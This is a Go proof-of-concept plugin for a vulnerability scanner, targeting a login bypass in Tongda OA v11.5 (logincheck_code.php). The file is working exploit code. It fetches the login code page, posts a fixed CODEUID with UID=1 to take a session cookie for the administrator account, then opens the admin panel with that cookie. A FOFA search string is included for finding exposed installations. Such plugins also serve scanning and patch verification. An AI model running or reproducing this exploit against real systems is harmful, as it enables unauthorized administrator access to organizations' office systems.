package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.5_logincheck_code_登陆绕过漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.5_logincheck_code_存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台",
			Date:     "2023-10-08",
			Tags:     []string{"通达OA", "TongdaOA", "Cookie", "任意登录"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.5%20logincheck_code.php%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 发送第一个请求
	requestOption1 := &httpclient.RequestOptions{
		Method: http.MethodGet,
		URL:    Target + "/general/login_code.php",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Accept-Encoding": "gzip",
		},
		ProxyURL: ProxyURL,
	}

	responseOption1, success1 := httpclient.SendRequest(*requestOption1)
	Httprecord[requestOption1] = responseOption1

	if responseOption1.Err != nil {
		// 处理错误
		return false, responseOption1.Err
	} else {
		if !success1 {
			// 发送请求失败
			return false, errors.New("第一个请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode1 := responseOption1.StatusCode
	if statusCode1 == http.StatusOK && len(responseOption1.Body) > 100 {
		// 发送第二个请求
		requestBody2 := "CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1"
		requestOption2 := &httpclient.RequestOptions{
			Method: http.MethodPost,
			URL:    Target + "/logincheck_code.php",
			Headers: map[string]string{
				"User-Agent":      httpclient.RandomUserAgent(),
				"Content-Type":    "application/x-www-form-urlencoded",
				"Content-Length":  fmt.Sprintf("%d", len(requestBody2)),
				"Accept-Encoding": "gzip",
			},
			ProxyURL:    ProxyURL,
			RequestBody: []byte(requestBody2),
		}

		responseOption2, success2 := httpclient.SendRequest(*requestOption2)
		Httprecord[requestOption2] = responseOption2

		if responseOption2.Err != nil {
			// 处理错误
			return false, responseOption2.Err
		} else {
			if !success2 {
				// 发送请求失败
				return false, errors.New("第二个请求失败")
			}
		}

		statusCode2 := responseOption2.StatusCode
		if statusCode2 == http.StatusOK {
			// 检查响应头是否包含 Set-Cookie
			cookies := responseOption2.Header.Get("Set-Cookie")
			if cookies != "" {
				// 取得 Set-Cookie 值
				cookieValue := strings.Split(cookies, ";")[0]

				// 发送第三个请求，携带 Cookie
				requestOption3 := &httpclient.RequestOptions{
					Method: http.MethodGet,
					URL:    Target + "/general/index.php",
					Headers: map[string]string{
						"User-Agent":      httpclient.RandomUserAgent(),
						"Cookie":          cookieValue,
						"Accept-Encoding": "gzip",
					},
					ProxyURL: ProxyURL,
				}

				responseOption3, success3 := httpclient.SendRequest(*requestOption3)
				Httprecord[requestOption3] = responseOption3

				if responseOption3.Err != nil {
					// 处理错误
					return false, responseOption3.Err
				} else {
					if !success3 {
						// 发送请求失败
						return false, errors.New("第三个请求失败")
					}
				}

				statusCode3 := responseOption3.StatusCode
				if statusCode3 == http.StatusOK {
					// 在这里可以添加更多的逻辑来判断漏洞是否成功利用
					return true, nil
				}
			}
		}
	}
	return false, nil
}
